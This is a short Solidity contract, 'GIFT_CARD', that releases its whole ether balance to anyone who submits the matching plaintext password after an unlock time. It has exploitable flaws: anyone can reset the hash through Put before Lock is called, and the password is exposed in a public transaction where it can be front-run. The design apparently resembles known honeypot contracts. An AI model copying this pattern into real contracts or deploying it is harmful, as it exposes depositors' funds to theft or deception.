1 pragma solidity ^0.4.19;
2 
3 contract GIFT_CARD
4 {
5     function Put(bytes32 _hash, uint _unlockTime)
6     public
7     payable
8     {
9         if(!locked && msg.value > 200000000000000000)// 0.2 ETH
10         {
11             unlockTime = now+_unlockTime;
12             hashPass = _hash;
13         }
14     }
15     
16     function Take(bytes _pass)
17     external
18     payable
19     access(_pass)
20     {
21         if(hashPass == keccak256(_pass) && now>unlockTime && msg.sender==tx.origin)
22         {
23             msg.sender.transfer(this.balance);
24         }
25     }
26     
27     function Lock(bytes _pass)
28     external
29     payable
30     access(_pass)
31     {
32         locked = true;
33     }
34     
35     modifier access(bytes _pass)
36     {
37         if(hashPass == keccak256(_pass) && now>unlockTime && msg.sender==tx.origin)
38         _;
39     }
40     
41     bytes32 public hashPass;
42     uint public unlockTime;
43     bool public locked = false;
44     
45     function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
46     
47     function() public payable{}
48 }